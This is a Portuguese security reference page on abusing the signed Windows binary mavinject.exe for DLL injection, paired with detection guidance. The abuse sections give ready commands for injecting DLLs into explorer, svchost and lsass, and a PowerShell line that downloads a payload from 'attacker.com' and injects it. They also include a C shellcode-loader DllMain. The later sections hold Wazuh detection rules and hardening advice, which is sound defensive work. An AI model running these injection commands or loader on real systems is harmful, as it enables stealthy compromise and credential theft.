# mavinject.exe

**Plataforma:** Windows

**Categorias:** Injeção de processo, Defense Evasion, AWL Bypass

**MITRE ATT&CK:** T1055.001 (Process Injection — Dynamic-link Library Injection), T1218 (Signed Binary Proxy Execution)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Mavinject/

---

## O que é o mavinject.exe

O mavinject.exe (Microsoft Application Virtualization Injector) é uma ferramenta incluída no Windows 10 e versões posteriores como parte do subsistema App-V (Application Virtualization). Sua função legítima é injetar uma DLL em um processo em execução para fins de virtualização — permitindo que aplicações App-V interceptem chamadas de API e redirecionem acesso a recursos como o registro e o sistema de arquivos.

O binário é assinado pela Microsoft e está presente em `C:\Windows\System32\mavinject.exe` em sistemas que têm o App-V instalado.

---

## Por que atacantes usam o mavinject

O mavinject executa injeção de DLL de maneira legítima e documentada — e por ser um binário assinado pela Microsoft, contorna verificações de autorização baseadas em assinatura de código. Em termos práticos: um atacante pode injetar uma DLL maliciosa em um processo legítimo como `explorer.exe`, `svchost.exe` ou qualquer outro processo em execução, sem precisar escrever código de injeção próprio.

A injeção de DLL em um processo legítimo oculta a execução do payload sob o contexto de um processo confiável, tornando análise de processo e correlação de eventos mais complexa para o analista.

---

## Técnicas de abuso

### Injeção de DLL em processo em execução

```cmd
:: Injetar DLL no processo com PID especificado
:: Sintaxe: mavinject.exe <PID> /INJECTRUNNING <caminho_da_dll>
mavinject.exe 1234 /INJECTRUNNING C:\Windows\Temp\payload.dll

:: Injetar em notepad.exe (processo comum para test bed)
:: Primeiro, descobrir o PID
for /f "tokens=2" %i in ('tasklist /fi "imagename eq notepad.exe" /fo csv /nh') do @echo %i
mavinject.exe <PID_notepad> /INJECTRUNNING C:\Windows\Temp\payload.dll

:: Injetar em explorer.exe para execução persistente em contexto de desktop
for /f "tokens=2" %i in ('tasklist /fi "imagename eq explorer.exe" /fo csv /nh') do @echo %i
mavinject.exe <PID_explorer> /INJECTRUNNING C:\Windows\Temp\hook.dll
```

### Injeção via PowerShell para encadear com outros LOLBins

```powershell
# Obter PID do processo alvo e injetar
$target = (Get-Process -Name "explorer").Id
& "C:\Windows\System32\mavinject.exe" $target /INJECTRUNNING "C:\Windows\Temp\payload.dll"

# Versão com download da DLL antes da injeção
$dllPath = "C:\Windows\Temp\srv.dll"
(New-Object System.Net.WebClient).DownloadFile("http://attacker.com/payload.dll", $dllPath)
$pid_target = (Get-Process -Name "svchost" | Select-Object -First 1).Id
& "C:\Windows\System32\mavinject.exe" $pid_target /INJECTRUNNING $dllPath
```

### Injeção em processos privilegiados

Se o atacante está rodando como administrador, pode injetar em qualquer processo do sistema:

```cmd
:: Injetar em svchost.exe — executa DLL sob contexto de serviço
mavinject.exe <PID_svchost> /INJECTRUNNING C:\Windows\Temp\stager.dll

:: Injetar em lsass.exe — acesso a credenciais em memória
:: Requer SeDebugPrivilege
mavinject.exe <PID_lsass> /INJECTRUNNING C:\Windows\Temp\dump_creds.dll
```

### Uso com DLL de shellcode loader

A DLL injetada via mavinject não precisa exportar funções específicas — o código no `DllMain` é executado quando a DLL é carregada no processo alvo. Uma DLL de shellcode loader típica para uso com mavinject:

```c
#include <windows.h>

// Shellcode de exemplo — meterpreter ou outro payload
unsigned char shellcode[] = { 0x90, 0x90, ... };

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        PVOID mem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,
                                  PAGE_EXECUTE_READWRITE);
        memcpy(mem, shellcode, sizeof(shellcode));
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
    }
    return TRUE;
}
```

---

## Técnicas de bypass e evasão

### Escolher processo alvo com base no perfil de rede

```powershell
# Injetar em processo que já tem conexões de rede estabelecidas para o exterior
# — o tráfego do payload se mistura ao tráfego legítimo
Get-NetTCPConnection -State Established | Where-Object RemoteAddress -NotMatch "^(10\.|192\.168\.|127\.)" | 
    Select-Object OwningProcess -First 1
```

### DLL reflexiva (sem arquivo em disco)

Uma variação avançada usa uma DLL que se carrega reflexivamente em memória, minimizando artefatos em disco. O mavinject ainda precisa receber um caminho de arquivo, mas a DLL carregada pode resolver seus próprios imports sem passar pela API do carregador do Windows, complicando análise.

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- mavinject.exe com argumento `/INJECTRUNNING` seguido de caminho de DLL
- mavinject.exe com DLL em diretórios temporários ou de usuário
- mavinject.exe injetando em processos sensíveis: lsass.exe, explorer.exe, svchost.exe
- Criação de thread remota pelo processo alvo logo após execução do mavinject (Sysmon Event ID 8)
- Carregamento de DLL não assinada em processo que normalmente não carrega DLLs externas (Sysmon Event ID 7)

**Indicadores de média relevância:**

- mavinject.exe executado em sistemas sem App-V instalado — incomum
- mavinject.exe invocado por script (PowerShell, cmd, wscript) em vez de processo de App-V

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0201-lolbas_execution.xml -->

<!-- mavinject com INJECTRUNNING — injeção de DLL -->
<rule id="100347" level="15">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)mavinject(32|64)?\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/INJECTRUNNING</field>
  <description>mavinject executando injecao de DLL em processo — possivel execucao furtiva de payload</description>
  <mitre>
    <id>T1055.001</id>
  </mitre>
</rule>

<!-- mavinject com DLL em diretório suspeito -->
<rule id="100348" level="14">
  <if_group>sysmon</if_group>
  <field name="win.eventdata.image" type="pcre2">(?i)mavinject(32|64)?\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Temp\\|\\Users\\|\\AppData\\|\\Downloads\\|\\ProgramData\\)</field>
  <description>mavinject injetando DLL a partir de diretorio nao padrao — caminho suspeito para modulo injetado</description>
  <mitre>
    <id>T1055.001</id>
  </mitre>
</rule>

<!-- Criação de thread remota por processo alvo (correlação com injeção) -->
<rule id="100349" level="13">
  <field name="win.system.eventID">8</field>
  <field name="win.eventdata.sourceImage" type="pcre2">(?i)mavinject(32|64)?\.exe</field>
  <description>mavinject criando thread remota em processo alvo — injecao de codigo confirmada</description>
  <mitre>
    <id>T1055.001</id>
  </mitre>
</rule>
```

### Falsos positivos comuns e como reduzir o ruído

**Ambientes com App-V ativo:** o mavinject é usado pelo App-V para suas funções legítimas de virtualização. Em ambientes com App-V amplamente implantado, o mavinject executa frequentemente. Nesses casos, o filtro deve focar em caminhos de DLL — o App-V usa DLLs em caminhos específicos do sistema App-V, não em `%TEMP%` ou diretórios de usuário.

**Ausência em sistemas sem App-V:** em sistemas Windows 10 sem App-V instalado, o mavinject.exe pode não estar presente. Qualquer execução nesse contexto é suspeita por definição.

---

## Proteção e controles defensivos

**Desinstalar App-V quando não necessário:** em estações de trabalho onde o App-V não está em uso, o mavinject.exe pode ser removido ou bloqueado via AppLocker/WDAC. Isso elimina completamente o vetor.

**Habilitar Kernel Patch Protection e Credential Guard:** o Credential Guard protege contra injeção em LSASS especificamente, isolando o processo em um ambiente virtualizado.

**Monitorar Event ID 8 do Sysmon (CreateRemoteThread):** a injeção de DLL via mavinject resulta sempre em criação de thread remota, detectável pelo Sysmon. Regras de correlação que combinam execução do mavinject com Event ID 8 têm altíssima fidelidade.

---

## Referências

- LOLBAS — mavinject: https://lolbas-project.github.io/lolbas/Binaries/Mavinject/
- MITRE ATT&CK T1055.001: https://attack.mitre.org/techniques/T1055/001/
